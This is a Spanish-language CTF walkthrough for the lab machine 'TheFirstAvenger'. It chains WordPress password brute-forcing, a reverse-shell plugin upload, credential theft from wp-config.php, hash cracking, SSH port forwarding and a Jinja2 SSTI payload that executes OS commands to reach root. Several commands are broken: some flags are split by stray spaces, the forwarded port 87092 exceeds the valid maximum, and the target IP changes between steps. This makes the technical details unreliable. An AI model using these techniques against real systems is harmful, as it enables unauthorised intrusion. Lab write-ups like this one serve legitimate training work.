# 🛡️ Resolución del CTF "TheFirstAvenger" | TheHackersLabs

**Plataforma:** TheHackersLabs  
**Nombre de la máquina:** TheFirstAvenger  
**Dificultad:** Alta  
**Enfoque:** Enumeración web, explotación WordPress, SSTI en Jinja2, port forwarding, escalada a root

---

## 🔍 1. Escaneo de puertos con Nmap

```bash
nmap -p- -- open -sS -sC -sV -- min-rate 5000 -n -vvV -Pn 172.20.10.6 -oN escaneo.txt
```

Servicios detectados:

- 22 → OpenSSH  
- 80 → Apache HTTP

---

## 🌐 2. Análisis del puerto 80 y enumeración

Página WordPress accesible → `/wp-login.php`

Con `gobuster` descubrimos rutas adicionales en `/wp-content`, `/wp-admin`, etc.

---

## 🔍 3. Enumeración WordPress con WPScan

```bash
wpscan -- url http://thefirstavenger.thl/wp1/ \
-- passwords /usr/share/wordlists/rockyou.txt \
-- usernames admin \
-- disable-tls-checks \
-- random-user-agent \
-- max-threads 5 \
-- throttle 1 \
--no-update \
-- no-banner
```

Credenciales válidas encontradas:

- Usuario: `admin`
- Contraseña: `spongebob`

---

## 🔓 4. Acceso al panel de administración

Se sube una reverse shell como plugin (`revshell.php`) y se activa desde el panel admin.

---

## 🧠 5. Acceso por reverse shell

```bash
nc -lvnp 1234
```

Reverse shell conectada desde WordPress con permisos limitados.

---

## 🔐 6. Enumeración de archivos: `wp-config.php`

Se obtienen credenciales de MySQL desde el archivo `wp-config.php`.

Se conecta a MySQL y se accede a la base `topsecret`. Se recuperan hashes de usuarios.

---

## 🔓 7. Cracking de hash

Con `john` y `rockyou.txt` se crackea la contraseña del usuario `steve`.

---

## 💻 8. Acceso SSH como `steve`

```bash
ssh steve@192.168.1.127
```

---

## 🛠️ 9. Detección de puerto interno: 7092

Con `netstat` se detecta un servicio Flask corriendo localmente en el puerto 7092.

---

## 🔄 10. Port Forwarding

```bash
ssh -N -L 87092:127.0.0.1:7092 steve@192.168.1.127
```

Ahora el servicio Flask es accesible en `http://localhost:87092`

---

## 💥 11. Explotación SSTI en Flask (Jinja2)

Input vulnerable a SSTI → se prueba con payloads como:

```jinja
{{7*7}}
{{config}}
{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}
```

Finalmente se lanza una reverse shell desde la SSTI.

---

## 🚪 12. Acceso como root

Gracias al SSTI ejecutando una shell como root, se obtiene acceso completo:

```bash
whoami
> root
```

---

## 🏁 13. Conclusión

- Enumeración WordPress y explotación vía plugin
- Reverse shell inicial y análisis de configuración
- Acceso a base de datos y crackeo de hash
- Acceso SSH como `steve`
- Port forwarding y explotación de SSTI
- Escalada a root

CTF con múltiples vectores reales y encadenamiento de técnicas web, hash cracking y explotación de SSTI.

